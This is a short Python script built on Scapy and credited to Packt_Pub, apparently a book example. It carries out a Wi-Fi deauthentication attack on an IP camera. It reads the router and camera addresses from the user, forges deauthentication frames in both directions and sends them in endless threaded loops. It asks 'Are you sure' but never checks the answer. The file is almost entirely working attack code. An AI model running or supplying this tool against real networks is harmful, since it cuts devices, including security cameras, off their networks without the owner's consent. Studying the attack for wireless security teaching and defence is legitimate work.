#Credit: Packt_Pub

from scapy.all import *
#import shelve
import sys
import os
from threading import Thread

def for_ap(frame, interface):
  while True:
    sendp(frame, iface = interface, count = 20, inter = 0.1)

def for_client(frame, interface):
  '''Sends 20 packets to victim every 0.1 seconds'''
  while True:
    sendp(frame, iface = interface, count = 20, inter = 0.001)

def main():
  router_channel = input('Enter router channel: ')
  device_SSID = input('Enter SSID: ')
  router_BSSID = input('Enter router BSSID: ')
  camera_mac_address = input('Enter MAC Address of the ip camera: ')
  interface = input('Enter interface: ')#wlan0, etc
  
  answer = input('Are you sure you want to attack '+ camera_mac_address + '?: ' )

  '''Create deauthentication packets'''

  frame = RadioTap() / Dot11(addr1 = router_BSSID, addr2 = camera_mac_address, addr3 = router_BSSID) / Dot11Deauth()

  frame1 = RadioTap() / Dot11(addr1 = camera_mac_address, addr2 = router_BSSID, addr3 = router_BSSID) / Dot11Deauth()

  '''Start threads for attack'''
  if len(camera_mac_address) != 17:
    raise Exception("Incorrect MAC address format")
  else:
    t1 = Thread(target = for_ap, args = (frame, interface))
    t1.start()
    t2 = Thread(target = for_client, args = (frame1, interface))
    t2.start()

if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    print("Deauthentication attack halted.")

